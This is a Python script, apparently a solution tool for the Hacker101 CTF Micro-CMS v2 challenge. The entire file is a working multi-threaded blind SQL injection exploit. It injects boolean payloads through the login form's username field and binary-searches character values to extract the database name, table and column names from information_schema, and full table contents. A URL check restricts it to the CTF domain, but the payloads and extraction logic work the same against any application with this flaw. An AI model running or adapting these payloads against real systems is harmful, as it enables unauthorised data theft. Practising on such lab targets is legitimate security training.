# ==============================================================================
# Title: Hacker101 CTF - Micro-CMS v2 Blind SQL Injection Exploit
# Author: [챕터/cooqxj]
# Description: Multi-threaded automated scanner for Blind SQLi in Micro-CMS v2.
# License: MIT License
# Date: 2026-01-30
# ==============================================================================

import requests
import re
from concurrent.futures import ThreadPoolExecutor

def show_banner():
    print("\n" + "="*60)
    print("   [HACKER101 CTF] Micro-CMS v2 Blind SQL Injection Tool")
    print("-" * 60)
    print("   [!] WARNING: FOR WARGAME & EDUCATIONAL PURPOSES ONLY!")
    print("   Unauthorized testing is strictly prohibited.")
    print("="*60 + "\n")

class Config:
    url = ""
    url_pattern = r"^https://([a-zA-Z0-9-]+)\.ctf\.hacker101\.com/login$"
    
    match_str = "Invalid password"

class Validator:
    @staticmethod
    def setup():
        while True:
            print("\n[example] Target URL: https://{HACKER101 CTF Micro-CMS v2}/login")
            val = input("Target URL: ").strip()

            if re.match(Config.url_pattern, val):
                print(f"[*] Attempting to connect to {val}...")

                try:
                    res = requests.get(val, timeout=5)
                    if res.status_code == 200 and "Log In" in res.text:
                        print(f"[+] Connection established!")
                        Config.url = val
                        break
                    else:
                        print("[-] Connection failed. Please check the URL.")
                except requests.exceptions.RequestException:
                    print(f"[-] Connection Timeout.")

            else:
                print(f"\n[!] Invalid URL format.")

class Scanner:
    MAX_THREADS = 8

    @staticmethod
    def get_result(payload_username):
        data = {'username': payload_username, 'password': 'password'}
        try:
            res = requests.post(Config.url, data=data, timeout=5)
            return Config.match_str in res.text
        except:
            return False

    @staticmethod
    def extract_char(query, index):
        low, high = 32, 126
        found_char = ""

        check_payload = f"diane' AND (SELECT LENGTH(({query}))) >= {index}; --"
        if not Scanner.get_result(check_payload):
            return None

        while low <= high:
            mid = (low + high) // 2
            payload = f"diane' AND ASCII(SUBSTR(({query}), {index}, 1)) > {mid}; --"
            if Scanner.get_result(payload):
                low = mid + 1
                found_char = chr(low)
            else:
                high = mid - 1
                found_char = chr(mid)
        return found_char

    @staticmethod
    def extract_single_row(query):
        print(f"[*] Extracting data... (Threads: {Scanner.MAX_THREADS})")
        results = {}
        
        with ThreadPoolExecutor(max_workers=Scanner.MAX_THREADS) as executor:
            future_to_index = {executor.submit(Scanner.extract_char, query, i): i for i in range(1, 201)}
            
            for future in future_to_index:
                idx = future_to_index[future]
                char = future.result()
                if char:
                    results[idx] = char

        sorted_keys = sorted(results.keys())
        final_str = "".join([results[k] for k in sorted_keys])
        return final_str

    @staticmethod
    def extract_list(query_template, start_node=0, end_node=None):
        row_index = start_node
        extracted_list = []

        while True:
            if end_node is not None and row_index > end_node: break

            check_exists = f"diane' AND (SELECT COUNT(*) FROM ({query_template}) t) > {row_index}; --"
            if not Scanner.get_result(check_exists): break

            print(f"\n[+] Processing row: {row_index}")
            paginated_query = f"{query_template} LIMIT {row_index},1"
            
            row_data = Scanner.extract_single_row(paginated_query)
            
            if row_data:
                print(f"    => Result: {row_data}")
                extracted_list.append(row_data)
                row_index += 1
            else:
                break
        return extracted_list

if __name__ == "__main__":
    show_banner()
    Validator.setup()

    if Config.url:
        db_name = Scanner.extract_single_row("database()")
        print(f"\n[✔] Current DB: {db_name}")

        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
        tables = Scanner.extract_list(table_query)
        print(f"\n[✔] Available Tables: {tables}")

        while True:
            print("\n" + "="*50)
            target_table = input("Enter table name to scan ('q' to quit): ").strip()

            if target_table.lower() == 'q':
                print("[*] Exiting...")
                break

            if target_table not in tables:
                print(f"[!] Table '{target_table}' not found in list.")
                continue

            print(f"[*] Extracting columns from '{target_table}'...")
            column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}'"
            columns = Scanner.extract_list(column_query)
            print(f"\n[✔] Columns in {target_table}: {columns}")

            if columns:
                do_data = input(f"[*] Dump data from '{target_table}'? (y/n): ").strip().lower()
                if do_data == 'y':
                    sep = " , ':', "
                    col_join = "CONCAT(" + ", ':', ".join(columns) + ")"
                    data_query = f"SELECT {col_join} FROM {target_table}"
                    Scanner.extract_list(data_query)
            
            print(f"\n[✔] Scan complete: {target_table}")